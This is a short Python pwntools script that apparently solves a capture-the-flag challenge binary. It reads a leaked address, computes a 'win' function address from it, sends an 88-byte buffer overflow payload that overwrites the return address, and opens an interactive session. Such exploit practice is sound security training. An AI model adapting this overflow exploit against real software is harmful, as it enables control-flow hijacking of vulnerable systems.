# coding: utf-8
from pwn import *
p = process("./chall_05")
#resp = p.recv()
#import re
#leak = re.findall(b"(0x[0-9a-f]{8,16})", resp)[0]

p.recvuntil(b"I wonder what this is: ")
leak = p.recvline()

winAddr = int(leak, 16) - 23
payload = 88*b"A" + p64(winAddr)
p.sendline(payload)
p.interactive()
